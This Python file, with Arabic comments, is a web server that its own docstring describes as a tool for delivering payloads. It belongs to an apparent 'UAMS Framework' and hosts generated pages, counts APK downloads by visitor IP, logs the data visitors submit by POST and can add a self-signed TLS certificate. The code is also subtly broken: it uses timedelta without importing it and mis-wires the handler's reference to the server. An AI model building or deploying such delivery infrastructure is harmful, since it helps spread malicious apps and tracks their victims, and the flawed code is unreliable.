# 📁 web_server/server.py
"""
خادم ويب لتوصيل الحمولات
"""

import http.server
import socketserver
import ssl
import threading
import json
from datetime import datetime
from pathlib import Path

class UAMSWebServer:
    def __init__(self, port=8000, web_root="generated_pages"):
        self.port = port
        self.web_root = Path(web_root)
        self.web_root.mkdir(exist_ok=True)
        
        self.handler = None
        self.server = None
        self.running = False
        
        # سجلات الزوار
        self.access_log = Path("web_server/logs/access.log")
        self.access_log.parent.mkdir(exist_ok=True, parents=True)
        
        # إحصائيات
        self.stats = {
            'total_requests': 0,
            'unique_visitors': set(),
            'downloads': 0,
            'start_time': None
        }
    
    def start(self):
        """بدء خادم الويب"""
        if self.running:
            print("[!] الخادم يعمل بالفعل")
            return
        
        print(f"[*] بدء خادم الويب على منفذ {self.port}")
        
        # إنشاء handler مخصص
        self.handler = self._create_request_handler()
        
        try:
            self.server = socketserver.TCPServer(("0.0.0.0", self.port), self.handler)
            self.stats['start_time'] = datetime.now()
            
            # بدء الخادم في thread منفصل
            server_thread = threading.Thread(target=self.server.serve_forever)
            server_thread.daemon = True
            server_thread.start()
            
            self.running = True
            print(f"[+] خادم الويب يعمل: http://0.0.0.0:{self.port}")
            
            return True
            
        except Exception as e:
            print(f"[-] فشل بدء خادم الويب: {e}")
            return False
    
    def stop(self):
        """إيقاف خادم الويب"""
        if self.server and self.running:
            self.server.shutdown()
            self.running = False
            print("[+] تم إيقاف خادم الويب")
    
    def _create_request_handler(self):
        """إنشاء request handler مخصص"""
        
        class UAMSRequestHandler(http.server.SimpleHTTPRequestHandler):
            def __init__(self, *args, **kwargs):
                self.parent = self  # Reference to outer class
                super().__init__(*args, directory=str(self.parent.web_root), **kwargs)
            
            def do_GET(self):
                """معالجة طلبات GET"""
                self.parent.stats['total_requests'] += 1
                
                # تسجيل الزائر
                client_ip = self.client_address[0]
                self.parent.stats['unique_visitors'].add(client_ip)
                
                # تسجيل الطلب
                self._log_access(client_ip, self.path)
                
                # إذا كان الطلب لملف APK، زيادة عداد التنزيلات
                if self.path.endswith('.apk'):
                    self.parent.stats['downloads'] += 1
                    print(f"[+] تحميل ملف: {self.path} بواسطة {client_ip}")
                
                # توجيه للـ handler العادي
                super().do_GET()
            
            def do_POST(self):
                """معالجة طلبات POST"""
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length).decode('utf-8')
                
                # تسجيل البيانات
                self._log_access(self.client_address[0], self.path, post_data[:200])
                
                # رد افتراضي
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                
                response = {"status": "success", "message": "Request received"}
                self.wfile.write(json.dumps(response).encode())
            
            def _log_access(self, ip, path, data=""):
                """تسجيل الوصول"""
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                user_agent = self.headers.get('User-Agent', 'Unknown')
                
                log_entry = f"{timestamp} - {ip} - {path} - {user_agent}"
                if data:
                    log_entry += f" - Data: {data}"
                
                log_entry += "\n"
                
                try:
                    with open(self.parent.access_log, 'a', encoding='utf-8') as f:
                        f.write(log_entry)
                except:
                    pass
            
            def log_message(self, format, *args):
                """تعديل رسائل الـ log"""
                # تقليل الضوضاء
                pass
        
        # تعيين parent reference
        UAMSRequestHandler.parent = self
        
        return UAMSRequestHandler
    
    def enable_ssl(self, certfile="web_server/ssl/cert.pem", keyfile="web_server/ssl/key.pem"):
        """تفعيل SSL/TLS"""
        if not self.server:
            print("[-] الخادم غير مشغل")
            return False
        
        # إنشاء شهادة SSL إذا لم تكن موجودة
        ssl_dir = Path("web_server/ssl")
        ssl_dir.mkdir(exist_ok=True)
        
        if not Path(certfile).exists() or not Path(keyfile).exists():
            print("[*] إنشاء شهادة SSL ذاتية التوقيع...")
            self._generate_self_signed_cert(certfile, keyfile)
        
        try:
            # تطبيق SSL
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(certfile, keyfile)
            
            self.server.socket = context.wrap_socket(self.server.socket, server_side=True)
            
            print(f"[+] SSL مفعل: https://0.0.0.0:{self.port}")
            return True
            
        except Exception as e:
            print(f"[-] فشل تفعيل SSL: {e}")
            return False
    
    def _generate_self_signed_cert(self, certfile, keyfile):
        """إنشاء شهادة SSL ذاتية التوقيع"""
        try:
            from cryptography import x509
            from cryptography.x509.oid import NameOID
            from cryptography.hazmat.primitives import hashes, serialization
            from cryptography.hazmat.primitives.asymmetric import rsa
            from cryptography.hazmat.backends import default_backend
            
            # إنشاء مفتاح خاص
            key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048,
                backend=default_backend()
            )
            
            # إنشاء شهادة
            subject = issuer = x509.Name([
                x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
                x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "California"),
                x509.NameAttribute(NameOID.LOCALITY_NAME, "San Francisco"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "UAMS Framework"),
                x509.NameAttribute(NameOID.COMMON_NAME, "uams.local"),
            ])
            
            cert = x509.CertificateBuilder().subject_name(
                subject
            ).issuer_name(
                issuer
            ).public_key(
                key.public_key()
            ).serial_number(
                x509.random_serial_number()
            ).not_valid_before(
                datetime.now()
            ).not_valid_after(
                datetime.now() + timedelta(days=365)
            ).add_extension(
                x509.SubjectAlternativeName([x509.DNSName("localhost")]),
                critical=False,
            ).sign(key, hashes.SHA256(), default_backend())
            
            # حفظ المفتاح الخاص
            with open(keyfile, "wb") as f:
                f.write(key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.TraditionalOpenSSL,
                    encryption_algorithm=serialization.NoEncryption()
                ))
            
            # حفظ الشهادة
            with open(certfile, "wb") as f:
                f.write(cert.public_bytes(serialization.Encoding.PEM))
            
            print("[+] تم إنشاء شهادة SSL بنجاح")
            
        except ImportError:
            print("[-] المكتبات المطلوبة لـ SSL غير مثبتة")
            print("[*] قم بتشغيل: pip install cryptography")
    
    def get_stats(self):
        """الحصول على إحصائيات الخادم"""
        stats = self.stats.copy()
        stats['unique_visitors_count'] = len(stats['unique_visitors'])
        
        if stats['start_time']:
            uptime = datetime.now() - stats['start_time']
            stats['uptime_seconds'] = uptime.total_seconds()
            stats['uptime_human'] = str(uptime).split('.')[0]
        
        return stats
    
    def get_access_logs(self, limit=100):
        """الحصول على سجلات الوصول"""
        logs = []
        
        if self.access_log.exists():
            with open(self.access_log, 'r', encoding='utf-8') as f:
                logs = f.readlines()[-limit:]
        
        return logs

# تشغيل الخادم
if __name__ == "__main__":
    server = UAMSWebServer(port=8000)
    
    try:
        server.start()
        
        # تشغيل SSL (اختياري)
        # server.enable_ssl()
        
        print("\n[*] اضغط Ctrl+C لإيقاف الخادم\n")
        
        # إبقاء البرنامج شغالاً
        import time
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n[*] إيقاف الخادم...")
        server.stop()